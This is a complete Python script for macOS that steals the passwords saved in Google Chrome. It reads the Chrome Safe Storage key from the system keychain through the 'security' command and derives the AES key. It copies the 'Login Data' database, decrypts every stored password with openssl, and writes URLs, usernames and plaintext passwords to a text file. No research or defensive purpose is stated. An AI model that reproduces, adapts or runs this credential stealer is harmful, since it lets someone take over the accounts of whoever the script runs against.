import os
import base64
import sqlite3
import shutil
import subprocess
import hashlib
import binascii

def get_encryption_key():
    return subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).decode('utf-8').replace("\n", "").replace("\"", "")

def decrypt_password(password, key, iv):
    hexKey = binascii.hexlify(key).decode('utf-8')
    hexEncPassword = base64.b64encode(password[3:]).decode('utf-8')

    if len(hexEncPassword) == 0:
        return 'ERROR retrieving password'

    try: #send any error messages to /dev/null to prevent screen bloating up
        decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
    except Exception as e:
        decrypted = b'ERROR retrieving password'

    return decrypted.decode('utf-8')

def main():
    native_key = get_encryption_key().encode('utf-8')
    iv = ''.join(('20',) * 16)
    aes_key = hashlib.pbkdf2_hmac('sha1', native_key, b'saltysalt', 1003)[:16]

    db_path = os.path.expanduser('~/Library/') + "Application Support/Google/Chrome/Default/Login Data"

    filename = "passwordsDB"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    entries = []

    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[2]
        password = decrypt_password(row[3], aes_key, iv)

        entry = {}
        entry['url'] = 'Undefined'
        entry['username'] = 'Undefined'
        entry['password'] = 'Undefined'

        if username or password:
            entry['url'] = origin_url
            entry['username'] = username
            entry['password'] = password
            entries.append(entry)
        else:
            continue

    cursor.close()
    db.close()

    try:
        os.remove(filename)
    except:
        pass

    with open('chrome_passwords.txt', 'w') as log:
        for entry in entries:
            log.write('URL: ' + entry['url'] + '\n')
            log.write('Username: ' + entry['username'] + '\n')
            log.write('Password: ' + entry['password'] + '\n')
            log.write('='*50 + '\n')

if __name__ == "__main__":
    main()
